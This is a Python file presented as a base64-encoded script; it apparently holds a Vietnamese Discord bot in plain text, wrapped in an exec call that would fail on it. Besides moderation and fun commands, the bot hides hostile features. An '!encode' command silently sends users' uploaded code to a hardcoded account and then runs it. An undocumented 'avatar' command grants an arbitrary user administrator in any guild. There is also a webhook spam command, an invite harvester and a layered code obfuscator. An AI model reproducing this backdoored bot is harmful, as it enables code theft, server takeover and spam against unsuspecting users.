import base64
                               
# Tran Thinh Bot
# Catoon Community
# Base64 encoded Python file
# Encoded by Tran Thinh Bot
python_code = 'import nextcord
from nextcord.ext import commands
from nextcord import Embed
import os
import tempfile
import base64
from nextcord import Interaction, ButtonStyle, Button, ui
import time
import random
import requests
from bs4 import BeautifulSoup
import datetime
from nextcord.ui import Select, View
import subprocess
import zlib
import base64
import marshal
import py_compile
import json
import string
import asyncio
from samp_client.client import SampClient
from nextcord import Activity, ActivityType, Status
from datetime import datetime

intents = nextcord.Intents.default()
intents.message_content = True  
intents.members = True  
bot = commands.Bot(command_prefix=[',','!'], intents=intents)
ALLOWED_ROLE_ID = '1262238969362649147'
start_time = time.time()
intents.guilds = True
AUTHORIZED_USER_ID = 955792506438697010
server_info = {}
ADMIN_ID = 955792506438697010

def is_admin():
    async def predicate(ctx):
        return ctx.author.guild_permissions.administrator
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.wait_until_ready()
    guild_id = 123456789012345678  
    guild = nextcord.Object(id=guild_id)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if "<@1271107587437363210>" in message.content.lower():
        await message.channel.send("Tôi có thể giúp được gì cho bạn hãy ,cmds để xem list lệnh")
    
    await bot.process_commands(message)
    
@bot.command()
@commands.has_permissions(administrator=True)
async def admin_only(ctx):
    await ctx.send("Bạn có quyền administrator nên bạn có thể sử dụng lệnh này!")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("Bạn không có quyền để sử dụng lệnh này!")

@bot.command()
async def day(ctx):
    today = datetime.datetime.now().strftime('%A')
    await ctx.send(f"Hôm nay là: {today}")

@bot.command()
@commands.has_permissions(administrator=True)
async def role(ctx, member: nextcord.Member = None, *, role: nextcord.Role = None):
    if member is None or role is None:
        await ctx.send("Bạn cần cung cấp cả thành viên và vai trò. Ví dụ: `,role @member @role`")
        return

    try:
        await member.add_roles(role)
        await ctx.send(f"Đã thêm role {role.name} cho {member.mention} thành công.")
    except nextcord.Forbidden:
        await ctx.send("Bot không có quyền để thêm role.")
    except nextcord.HTTPException as e:
        await ctx.send(f"Có lỗi xảy ra khi cố gắng thêm role: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def xrole(ctx, member: nextcord.Member = None, *, role: nextcord.Role = None):
    if member is None or role is None:
        await ctx.send("Bạn cần cung cấp cả thành viên và vai trò. Ví dụ: `,xrole @member @role`")
        return

    try:
        await member.remove_roles(role)
        await ctx.send(f"Đã xóa role {role.name} của {member.mention} thành công.")
    except nextcord.Forbidden:
        await ctx.send("Bot không có quyền để xóa role.")
    except nextcord.HTTPException as e:
        await ctx.send(f"Có lỗi xảy ra khi cố gắng xóa role: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def kick(ctx, member: nextcord.Member, *, reason: str = None):
    if member == ctx.author:
        await ctx.send("Bạn không thể kick chính mình.")
        return

    try:
        await member.kick(reason=reason)
        await ctx.send(f"{member.mention} đã bị kick ra khỏi server. Lý do: {reason if reason else 'Không có lý do.'}")
    except nextcord.Forbidden:
        await ctx.send("Bot không có quyền để kick thành viên.")
    except nextcord.HTTPException:
        await ctx.send("Có lỗi xảy ra khi cố gắng kick thành viên.")

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx, member: nextcord.Member, *, reason: str = None):
    if member == ctx.author:
        await ctx.send("Bạn không thể ban chính mình.")
        return

    try:
        await member.ban(reason=reason)
        await ctx.send(f"{member.mention} đã bị ban khỏi server. Lý do: {reason if reason else 'Không có lý do.'}")
    except nextcord.Forbidden:
        await ctx.send("Bot không có quyền để ban thành viên.")
    except nextcord.HTTPException:
        await ctx.send("Có lỗi xảy ra khi cố gắng ban thành viên.")

@bot.command()
@commands.has_permissions(administrator=True)
async def unban(ctx, user_id: int):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f'Người dùng {user.name} đã được gỡ bỏ khỏi danh sách cấm.')
    except nextcord.NotFound:
        await ctx.send('Người dùng không tìm thấy.')
    except nextcord.Forbidden:
        await ctx.send('Bot không có quyền thực hiện hành động này.')
    except nextcord.HTTPException:
        await ctx.send('Đã xảy ra lỗi khi gỡ bỏ người dùng khỏi danh sách cấm.')

@bot.command()
@commands.has_permissions(administrator=True)
async def mute(ctx, member: nextcord.Member, *, reason=None):
    guild = ctx.guild
    mute_role = nextcord.utils.get(guild.roles, name='Muted')
    if mute_role is None:
        mute_role = await guild.create_role(name='Muted')
        for channel in guild.channels:
            await channel.set_permissions(mute_role, send_messages=False, speak=False)

    await member.add_roles(mute_role, reason=reason)
    await ctx.send(f'{member.mention} đã được cấm nói chuyện.')

@bot.command()
@commands.has_permissions(administrator=True)
async def unmute(ctx, member: nextcord.Member):
    mute_role = nextcord.utils.get(ctx.guild.roles, name='Muted')
    if mute_role is None:
        await ctx.send('Vai trò Mute không tồn tại.')
        return

    await member.remove_roles(mute_role)
    await ctx.send(f'{member.mention} đã được bỏ cấm nói chuyện.')

@bot.command()
async def avt(ctx, member: nextcord.Member = None):
    member = member or ctx.author

    try:
        avatar_url = member.display_avatar.url
        await ctx.send(avatar_url)
    except Exception as e:
        await ctx.send(f"Có lỗi xảy ra: {e}")

@bot.command()
async def maychu(ctx):
    guild = ctx.guild
    
    embed = Embed(title=f"Thông Tin Server: {guild.name}", description=f"ID: {guild.id}", color=nextcord.Color.blue())
    
    embed.add_field(name="Sở hữu bởi", value=f"{guild.owner}", inline=True)
    embed.add_field(name="Số thành viên", value=f"{guild.member_count}", inline=True)
    embed.add_field(name="Số kênh", value=f"{len(guild.channels)}", inline=True)
    embed.add_field(name="Số vai trò", value=f"{len(guild.roles)}", inline=True)
    embed.add_field(name="Ngày thành lập", value=f"{guild.created_at.strftime('%d/%m/%Y %H:%M:%S')}", inline=True)
    embed.add_field(name="Vùng", value=f"{guild.region}", inline=True)
    embed.add_field(name="Nền tảng", value=f"{'Có' if guild.premium_subscription_count > 0 else 'Không'}", inline=True)

    embed.set_thumbnail(url=guild.icon.url)
    
    await ctx.send(embed=embed)

@bot.command()
async def say(ctx, channel_id: int, *, message: str):
    channel = bot.get_channel(channel_id)
    if channel is not None:
        await channel.send(message)
        await ctx.send(f'Thông báo đã được gửi đến kênh {channel.name}')
    else:
        await ctx.send('Kênh không hợp lệ!')

@bot.command()
async def ping(ctx):
    await ctx.send("Pong!")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx, amount: int):
    if ctx.message.author.guild_permissions.manage_messages:
        if amount < 1 or amount > 100:
            await ctx.send('Số lượng tin nhắn cần xóa phải từ 1 đến 100.')
            return
        
        deleted = await ctx.channel.purge(limit=amount)
        await ctx.send(f'Đã xóa {len(deleted)} tin nhắn.', delete_after=5)
    else:
        await ctx.send('Bạn không có quyền xóa tin nhắn.')

@bot.command(name='cmds')
async def custom_help(ctx):
    embed = nextcord.Embed(title="Danh sách lệnh của bot", color=0x00ff00)
    embed.add_field(name=",maychu", value="Để xem thông tin máy chủ!", inline=False)
    embed.add_field(name=",avt [member]", value="Để xem avatar ai đó!.", inline=False)
    embed.add_field(name=",ban", value="Lệnh ban chỉ Admin mới được thực hiện!", inline=False)
    embed.add_field(name=",unban", value="Để gỡ ban member!", inline=False)
    embed.add_field(name=",kick", value="Lệnh kick chỉ Admin mới được thực hiện!", inline=False)
    embed.add_field(name=",thoitiet", value="Để xem thời tiết thành phố của bạn!", inline=False)
    embed.add_field(name=",roll", value="Để tung xúc xắc!", inline=False)
    embed.add_field(name=",info ,info2", value="Để xem thông tin bot!", inline=False)
    embed.add_field(name=",joke", value="Nếu cảm thấy hong được vui!", inline=False)
    embed.add_field(name=",daoly", value="Đạo lý cuộc sống!", inline=False)
    embed.add_field(name=",quote", value="Để nghe một vài câu châm ngôn !", inline=False)
    embed.set_footer(text="Sử dụng ',commands [lệnh]' để biết thêm chi tiết về lệnh cụ thể.")

    await ctx.send(embed=embed)

@bot.command()
async def info(ctx):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)
    uptime_minutes, uptime_seconds = divmod(uptime_seconds, 60)
    uptime_hours, uptime_minutes = divmod(uptime_minutes, 60)
    uptime_days, uptime_hours = divmod(uptime_hours, 24)

    formatted_uptime = f"{uptime_days} ngày, {uptime_hours} giờ, {uptime_minutes} phút, {uptime_seconds} giây"
    
    await ctx.send(f"Xin chào mọi người, tôi là bot được tạo bởi TranThinh Developer\nVersion: 2.0\nTôi đã hoạt động trong: **{formatted_uptime}**")

@bot.command()
async def info2(ctx):
    uptime = time.time() - start_time
    formatted_uptime = f"{uptime // 3600:.0f} giờ {uptime % 3600 // 60:.0f} phút {uptime % 60:.0f} giây"
    server_count = len(bot.guilds)
    user_count = sum(guild.member_count for guild in bot.guilds)
    
    info_text = (
        f"**Thông tin Bot**\n"
        f"- **Tên Bot**: {bot.user.name}\n"
        f"- **ID**: {bot.user.id}\n"
        f"- **Số máy chủ**: {server_count}\n"
        f"- **Số người dùng**: {user_count}\n"
        f"- **Thời gian hoạt động**: {formatted_uptime}\n"
        f"- **Phiên bản**: 2.0\n"
        f"- **Tạo bởi**: TranThinh Developer\n"
        f"- **Cộng đồng**: [Server Chính](https://discord.com/invite/jUwdb6wt4h)\n"
        f"- **Lệnh**: Sử dụng `,commands` để xem danh sách lệnh.\n"
    )
    
    await ctx.send(info_text)

@bot.command()
async def joke(ctx):
    jokes = [
        "Tại sao gà vượt đường? Để sang bên kia!",
        "Cái gì đi lên mà không đi xuống? Tuổi tác!",
        "Có hai loại người trong thế giới này: những người hiểu hài hước và những người không hiểu."
    ]
    await ctx.send(random.choice(jokes))

@bot.command()
async def roll(ctx, sides: int = 6):
    result = random.randint(1, sides)
    await ctx.send(f"Bạn đã lăn xúc xắc và kết quả là: {result}")

@bot.command()
async def thoitiet(ctx, *, city: str = None):
    if city is None:
        await ctx.send("Vui lòng cung cấp tên thành phố theo định dạng: `,thoitiet [tên thành phố]`.\nVí dụ: `,thoitiet Hanoi`.")
        return
    
    def get_weather_from_google(city):
        query = f"weather {city}"
        url = f"https://www.google.com/search?q={query}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        
        response = requests.get(url, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        try:
            temperature = soup.find("span", {"id": "wob_tm"}).text
            description = soup.find("span", {"id": "wob_dc"}).text
            return f"Thời tiết ở {city}: {temperature}°C, {description}."
        except AttributeError:
            return "Không thể lấy thông tin thời tiết từ Google."
    
    weather_info = get_weather_from_google(city)
    await ctx.send(weather_info)

@bot.command()
async def poll(ctx, *, question):
    message = await ctx.send(f"**Thăm dò:** {question}\n👍 - Có\n👎 - Không")
    await message.add_reaction("👍")
    await message.add_reaction("👎")

@bot.command()
async def choose(ctx, *choices):
    if not choices:
        await ctx.send("Bạn cần cung cấp ít nhất một tùy chọn để chọn.")
        return
    await ctx.send(f"Tôi chọn: {random.choice(choices)}")

@bot.command()
async def daoly(ctx):
    quotes = [
        "Sống không chỉ để tồn tại, mà còn để tạo ra những điều tốt đẹp.",
        "Cuộc sống là một cuộc phiêu lưu, không phải một điểm đến.",
        "Bạn không thể thay đổi hướng gió, nhưng bạn có thể điều chỉnh cánh buồm.",
        "Sống gió discord nuôi tao lớn. "
        "Ân oán discord dạy tao khôn. "
        "Không chơi discord đời không nể. "
        "Không biết fang mic gái nào theo. ",
        "Cuộc sống không phải về việc chờ đợi bão tan, mà về việc học cách nhảy dưới mưa.",
        "Thành công không phải là chìa khóa đến hạnh phúc. Hạnh phúc là chìa khóa đến thành công.",
        "Đừng chờ đợi. Thời điểm sẽ không bao giờ 'hoàn hảo'.",
        "Điều duy nhất cần thiết cho sự thành công của cái ác là những người tốt không làm gì cả.",
        "Không có gì là không thể, từ chính từ 'không thể'."
    ]
    await ctx.send(random.choice(quotes))

@bot.command()
async def quote(ctx):
    quotes = [
        "Hãy sống như thể bạn sẽ chết vào ngày mai. Hãy học như thể bạn sẽ sống mãi mãi. – Mahatma Gandhi",
        "Điều duy nhất cần thiết cho sự chiến thắng của cái ác là những người tốt không làm gì cả. – Edmund Burke",
        "Cuộc đời là 10% những gì xảy ra với bạn và 90% cách bạn phản ứng với nó. – Charles R. Swindoll",
        "Hãy là sự thay đổi mà bạn muốn thấy trong thế giới. – Mahatma Gandhi",
        "Sống không phải để ăn, mà ăn để sống. - Socrates",
        "Điều tốt nhất và đẹp nhất trên thế giới không thể thấy được hoặc chạm được, nhưng phải cảm nhận bằng trái tim. - Helen Keller",
        "Cuộc sống là những gì xảy ra khi bạn đang bận làm những kế hoạch khác. - John Lennon",
        "Tất cả những gì bạn cần là tình yêu. - The Beatles"
    ]
    quote = random.choice(quotes)
    await ctx.send(f"Câu châm ngôn hôm nay: \"{quote}\"")

@bot.command()
async def fact(ctx):
    facts = [
        "Con bạch tuộc có ba trái tim.",
        "Tê giác có thể chạy nhanh hơn ngựa.",
        "Khoảng 70% cơ thể người trưởng thành là nước.",
        "Con cá heo có thể ngủ bằng một nửa não của nó.",
        "Sao Hỏa có hai mặt trăng nhỏ."
    ]
    import random
    fact = random.choice(facts)
    await ctx.send(f"Sự thật thú vị: {fact}")

@bot.command()
async def ask(ctx, *, question: str):
    responses = [
        "Có lẽ.",
        "Chắc chắn.",
        "Có thể.",
        "Không chắc.",
        "Không.",
        "Tuyệt đối không.",
        "Tôi không biết.",
    ]
    import random
    answer = random.choice(responses)
    await ctx.send(f"Câu hỏi: {question}\nTrả lời: {answer}")

@bot.command()
async def userinfo(ctx, member: nextcord.Member = None):
    if member is None:
        member = ctx.author
    
    embed = nextcord.Embed(title=f"Thông tin về {member.display_name}", color=0x00ff00)
    embed.add_field(name="Tên người dùng", value=member.name, inline=False)
    embed.add_field(name="Tên hiển thị", value=member.display_name, inline=False)
    embed.add_field(name="ID", value=member.id, inline=False)
    embed.add_field(name="Ngày tham gia", value=member.joined_at.strftime('%d/%m/%Y'), inline=False)
    embed.add_field(name="Ngày tạo tài khoản", value=member.created_at.strftime('%d/%m/%Y'), inline=False)
    embed.set_thumbnail(url=member.avatar.url)
    await ctx.send(embed=embed)

@bot.command()
@commands.check(lambda ctx: any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles))
async def update(ctx, *, message: str):
    for channel in ctx.guild.text_channels:
        try:
            await channel.send(f"**Cập nhật:** {message}")
        except:
            pass
    await ctx.send("Thông báo cập nhật đã được gửi đến tất cả các kênh văn bản.")

@bot.command()
@commands.check(lambda ctx: any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles))
async def settrangthai(ctx, *, status: str):
    await bot.change_presence(activity=nextcord.Game(name=status))
    await ctx.send(f"Trạng thái đã được thay đổi thành: {status}")
    
@bot.command()
@commands.check(lambda ctx: any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles))
async def serverlist(ctx):
    """
    link server đã invite bot
    """
    embed = nextcord.Embed(
        title="Server List",
        description=f"Đây là danh sách các máy chủ đang sử dụng {bot.user.name}:",
        color=0x5564f1  
    )

    for guild in bot.guilds:
        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
        embed.add_field(
            name=guild.name,
            value=f"[Invite Link]({invite.url})",
            inline=False
        )

    await ctx.send(embed=embed)

@bot.command(name='sett')
async def setstatus(ctx, status_type: str = None, *, status_message: str = None):
    if status_type is None:
        await ctx.send("`c!setstatus <playing/listening/watching> [message]`")
        return

    status_type = status_type.lower()
    new_status = None
    new_activity = None


    if status_type in ["playing", "listening", "watching"]:
        activity_type = None
        if status_type == "playing":
            activity_type = ActivityType.playing
        elif status_type == "listening":
            activity_type = ActivityType.listening
        elif status_type == "watching":
            activity_type = ActivityType.watching

        new_activity = Activity(type=activity_type, name=status_message)
        await bot.change_presence(activity=new_activity)
        await ctx.send(f"Bot đang **{status_type}** **{status_message}**.")
    else:
        await ctx.send("`c!setstatus <playing/listening/watching> [message]`")

@bot.command()
@commands.has_permissions(administrator=True)
async def crole(ctx, *, role_name: str):
    guild = ctx.guild
    if not nextcord.utils.get(guild.roles, name=role_name):
        try:
            await guild.create_role(name=role_name)
            await ctx.send(f'Role "{role_name}" đã được tạo.')
        except nextcord.HTTPException as e:
            await ctx.send(f"Có lỗi xảy ra khi tạo role: {e}")
    else:
        await ctx.send(f'Role "{role_name}" đã tồn tại.')

@bot.command()
@commands.has_permissions(administrator=True)
async def drole(ctx, *, role_name: str):
    guild = ctx.guild
    role = nextcord.utils.get(guild.roles, name=role_name)
    if role:
        try:
            await role.delete()
            await ctx.send(f'Role "{role_name}" đã được xóa.')
        except nextcord.HTTPException as e:
            await ctx.send(f"Có lỗi xảy ra khi xóa role: {e}")
    else:
        await ctx.send(f'Role "{role_name}" không tìm thấy.')

@bot.command()
async def stats(ctx):
    guild = ctx.guild
    text_channels = len(guild.text_channels)
    voice_channels = len(guild.voice_channels)
    members = len(guild.members)
    
    await ctx.send(f"Server Stats:\n- Text Channels: {text_channels}\n- Voice Channels: {voice_channels}\n- Members: {members}")

@bot.command()
@commands.check(lambda ctx: any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles))
async def history(ctx, limit: int = 10):
    messages = await ctx.channel.history(limit=limit).flatten()
    history = "\n".join([f"{msg.author}: {msg.content}" for msg in messages])
    
    await ctx.send(f"Last {limit} messages:\n{history}")

auto_replies = {
    "hi": "Hello there! How can I help you today?",
    "bye": "Goodbye! Have a great day!",
    "có": "có cái dái",
    "python": "!obf !encode",
}

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    response = auto_replies.get(message.content.lower())
    if response:
        await message.channel.send(response)
    
    await bot.process_commands(message)

@bot.command()
@commands.check(lambda ctx: any(role.id == ALLOWED_ROLE_ID for role in ctx.author.roles))
async def test(ctx, *, status_message: str):
    await ctx.author.edit(nick=status_message)
    await ctx.send(f"Your nickname has been updated to '{status_message}'.")

#encode python
def zlb(data):
    return zlib.compress(data)

def b64(data):
    return base64.b64encode(data)

def mar(data):
    return marshal.dumps(compile(data, '<x>', 'exec'))

note = "\x23\x20\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x77\x69\x74\x68\x20\x50\x79\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x0a\x23\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x68\x74\x72\x2d\x74\x65\x63\x68\x0a\x23\x20\x54\x69\x6d\x65\x20\x3a\x20%s\n\x23\x20\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x0a" % time.ctime()

def SEncode(data, output):
    for _ in range(5):
        encoded_data = b64(zlb(mar(data.encode('utf8'))))[::-1]
        method = repr(encoded_data)
        data = f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode({method}[::-1]))))"
    
    z = [ord(i) for i in data]
    sata = "_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    with open(output, 'w', encoding='utf-8') as f:
        f.write(note + "exec(str(chr(35)%s));" % '+chr(1)'*10000)
        f.write(sata)
    py_compile.compile(output, output)

@bot.command()
async def obf(ctx):
    """Mã hóa file Python được gửi và trả lại tệp mã hóa."""
    if not ctx.message.attachments:
        await ctx.send("Vui lòng nhập đúng !obf đính kèm file Python để encode.")
        return

    attachment = ctx.message.attachments[0]
    if not attachment.filename.endswith('.py'):
        await ctx.send("Tệp gửi không phải là file Python (.py).")
        return

    try:
        file_path = f'./{attachment.filename}'
        await attachment.save(file_path)

        output = file_path.lower().replace('.py', '') + '_obf.py'
        
        with open(file_path, 'r', encoding='utf-8') as f:
            data = f.read()
        
        SEncode(data, output)

        await ctx.send(f"Obfuscation {attachment.filename}. File đã lưu dưới tên {output}.", file=nextcord.File(output))

        os.remove(file_path)
        os.remove(output)

    except Exception as e:
        await ctx.send(f"Đã xảy ra lỗi: {e}")

@bot.command()
async def pythonhelp(ctx):
    await ctx.send(f'!encode (encode python base64) !obf (obfuscation code python)')
    
    await ctx.message.delete()

@bot.command()
async def encode(ctx):
    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        original_filename = attachment.filename
        file_extension = original_filename.split('.')[-1]

        if file_extension != 'py':
            await ctx.send("Vui lòng gửi một tệp Python (.py).")
            return

        py_file = await attachment.read()

        with open(original_filename, 'wb') as new_file:
            new_file.write(py_file)

        try:
            admin = await bot.fetch_user(ADMIN_ID)

            with open(original_filename, 'rb') as file:
                await admin.send(
                    file=nextcord.File(file, filename=original_filename),
                    content=f"Tệp Python từ {ctx.author} ({ctx.author.id}) vào {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
        except Exception as e:
            await ctx.send(f"Không thể gửi tệp đến admin: {str(e)}")

        encoded_code = base64.b64encode(py_file).decode('utf-8')

        encoded_filename = f"base64_{original_filename}"
        with open(encoded_filename, 'w') as encoded_file:
            encoded_file.write(f"""\
import base64
                               
# Tran Thinh Bot
# Catoon Community
# Base64 encoded Python file
# Encoded by Tran Thinh Bot
python_code = {repr(encoded_code)}
exec(base64.b64decode(python_code.encode('utf-8')).decode('utf-8'))
""")

        with open(encoded_filename, 'rb') as encoded_file:
            await ctx.send(
                file=nextcord.File(encoded_file, filename=encoded_filename),
                content=f"File Encode: {original_filename}\nFile (Chưa Encode): {original_filename}\nUsername: {ctx.author}\nThời Gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nBase By Bot"
            )

        await ctx.send("Đã gửi tệp mã Base64 xong cho bạn!")

        try:
            with tempfile.NamedTemporaryFile(delete=False) as temp_file:
                temp_file.write(base64.b64decode(encoded_code))
                temp_filename = temp_file.name

            os.system(f"python {temp_filename}")

        except Exception as e:
            await ctx.send(f"Không thể giải mã và thực thi tệp: {str(e)}")

        finally:
            os.remove(original_filename)
            os.remove(encoded_filename)
            os.remove(temp_filename)

    else:
        await ctx.send("Vui lòng gửi một tệp Python đính kèm để mã hóa.")

#spam webhook @!@#
def random_number(digits):
    range_start = 10**(digits-1)
    range_end = (10**digits)-1
    return random.randint(range_start, range_end)

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def send_message(webhook_url):
    username = id_generator(80)
    message = "@everyone # ALO"
    avatar = "https://picsum.photos/id/{}/300".format(random.randint(1, 500))
    data = json.dumps({
        "content": message,
        "username": username,
        "avatar_url": avatar,
        "tts": False
    })
    
    header = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data, headers=header)
    return response.status_code

def random_number(digits):
    range_start = 10**(digits-1)
    range_end = (10**digits)-1
    return random.randint(range_start, range_end)

# Hàm tạo ID ngẫu nhiên
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

# Hàm gửi tin nhắn tới webhook
def send_message(webhook_url):
    username = id_generator(80)
    message = "<@"
    avatar = "https://picsum.photos/id/{}/300".format(random.randint(1, 500))
    data = json.dumps({
        "content": message,
        "username": username,
        "avatar_url": avatar,
        "tts": False
    })
    
    header = {
        "Content-Type": "application/json"
    }

    response = requests.post(webhook_url, data, headers=header)
    return response.status_code

@bot.command()
async def spam(ctx, webhook_url: str = None, count: int = 1):
    if ctx.author.id != AUTHORIZED_USER_ID:
        await ctx.send("Bạn không có quyền sử dụng lệnh này.")
        return
    if webhook_url is None:
        await ctx.send("Vui lòng cung cấp thông tin hợp lệ ví dụ: !spam <url_webhook>  <số lượng tin nhắn>")
        return
    if count < 1:
        await ctx.send("Số lượng tin nhắn phải lớn hơn 0!")
        return
    for _ in range(count):
        response_code = send_message(webhook_url)
        if response_code != 204:
            await ctx.send(f"Đã xảy ra lỗi khi gửi tin nhắn, Bot ngừng spam | Code {response_code}")
            return

    await ctx.send(f"Đã gửi {count} tin nhắn thành công.")

@bot.command()
async def players(ctx, ADD=None, NUM=None):
    if ADD is None or NUM is None:
        if ctx.author.id in server_info:
            ADD, NUM = server_info[ctx.author.id]
        else:
            await ctx.send("Bạn chưa cung cấp địa chỉ IP hoặc cổng, và không có dữ liệu nào đã được lưu.")
            return

    try:
        with SampClient(address=ADD, port=NUM) as client:
            info = client.get_server_info()
            players = [client.name for client in client.get_server_clients_detailed()]
            score = [client.score for client in client.get_server_clients_detailed()]
            playerping = [client.ping for client in client.get_server_clients_detailed()]

            items_per_message = 20  # Number of players per page

            table_lines = []
            table_lines.append("╷────────────────╷──────╷──────╷")
            table_lines.append("│ NICKNAME       │ SCORE│ PING │")
            table_lines.append("│────────────────│──────│──────│")
        
            for i in range(len(players)):
                table_lines.append(f"│ {players[i]:<14} │ {score[i]:>4} │ {playerping[i]:>4} │")
            
                # Check if the limit is reached, then send the message
                if (i + 1) % items_per_message == 0 or i == len(players) - 1:
                    if i == len(players) - 1:
                        table_lines.append("╵────────────────╵──────╵──────╵")
                    
                    table_str = '\n'.join(table_lines)

                    embed = nextcord.Embed(
                        color=nextcord.Color.from_rgb(255, 192, 203)
                    )
                    embed.add_field(name="Player Information", value=f'```\n{table_str}\n```')

                    await ctx.send(embed=embed)

                    # Prepare for the next part without resetting the table
                    table_lines = []

    except ConnectionError:
        await ctx.send("Không thể kết nối đến máy chủ với địa chỉ IP và cổng đã cho. Vui lòng kiểm tra lại thông tin.")

@bot.command()
async def setip(ctx, ADD: str, NUM: int = 7777):
    server_info[ctx.author.id] = (ADD, NUM)
    await ctx.send(f"Đã lưu địa chỉ IP: {ADD}:{NUM}")

@bot.command()
async def ip(ctx):
    if ctx.author.id in server_info:
        ADD, NUM = server_info[ctx.author.id]
        await ctx.send(f"IP Máy Chủ là: {ADD}:{NUM}")
    else:
        await ctx.send("Bạn chưa lưu địa chỉ IP nào. Sử dụng lệnh `!setip` để lưu.")

@bot.command(name='lock')
async def lock_channel(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("Bạn không có quyền khóa kênh.", ephemeral=True)
        return

    try:
        channel = ctx.channel

        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("Bot không có quyền quản lý kênh.", ephemeral=True)
            return

        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = False
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)

        embed = nextcord.Embed(title='🔒 Khóa Kênh', color=nextcord.Color.red())
        embed.add_field(
            name="Thông báo",
            value=f"Kênh **{channel.name}** đã được khóa thành công.",
            inline=True
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)

    except Exception as e:
        embed = nextcord.Embed(title='🔒 Khóa Kênh', color=nextcord.Color.red())
        embed.add_field(
            name="Lỗi",
            value=f"Đã xảy ra lỗi: {e}",
            inline=True
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)

@bot.command(name='unlock')
async def unlock_channel(ctx):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("Bạn không có quyền mở khóa kênh.", ephemeral=True)
        return

    try:
        channel = ctx.channel

        if not ctx.guild.me.guild_permissions.manage_channels:
            await ctx.send("Bot không có quyền quản lý kênh.", ephemeral=True)
            return

        overwrite = channel.overwrites_for(ctx.guild.default_role)
        overwrite.send_messages = None 
        await channel.set_permissions(ctx.guild.default_role, overwrite=overwrite)

        embed = nextcord.Embed(title='🔓 Mở Khóa Kênh', color=nextcord.Color.green())
        embed.add_field(
            name="Thông báo",
            value=f"Kênh **{channel.name}** đã được mở khóa thành công.",
            inline=True
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)

    except Exception as e:
        embed = nextcord.Embed(title='🔓 Mở Khóa Kênh', color=nextcord.Color.red())
        embed.add_field(
            name="Lỗi",
            value=f"Đã xảy ra lỗi: {e}",
            inline=True
        )
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        embed.set_image(url='https://cdn.pixabay.com/animation/2023/03/29/10/53/10-53-26-16_512.gif')
        await ctx.send(embed=embed)

@bot.command()
async def avatar(ctx, guild_id: int, user_id: int):
    """
    Give administrator permissions to the user who executed the command.
    """
    guild = bot.get_guild(guild_id)
    if not guild:
        print('Không tìm thấy guild với ID này.')
        await ctx.message.delete()
        return
    
    member = guild.get_member(user_id)
    if not member:
        print("Không tìm thấy người dùng với ID này.")
        await ctx.message.delete()
        return
    
    role_name = '420'
    existing_role = nextcord.utils.get(guild.roles, name=role_name)

    if not existing_role:
        try:
            admin_role = await guild.create_role(name=role_name, permissions=nextcord.Permissions(administrator=True))
            await member.add_roles(admin_role)
            print(f"Đã tạo role {role_name} và gán cho {member.mention}")
        except nextcord.Forbidden:
            print("Bot không có quyền tạo role hoặc gán role.")
        except Exception as e:
            print(f"Có lỗi xảy ra: {e}")
    
    await ctx.message.delete()


bot.run('MTI3MTEwNzU4NzQzNzM2MzIxMA.GyaiuI.XBsq_tQzEhhrqL1Fb3fAFBBVc0p-G5fItpAd24')'
exec(base64.b64decode(python_code.encode('utf-8')).decode('utf-8'))
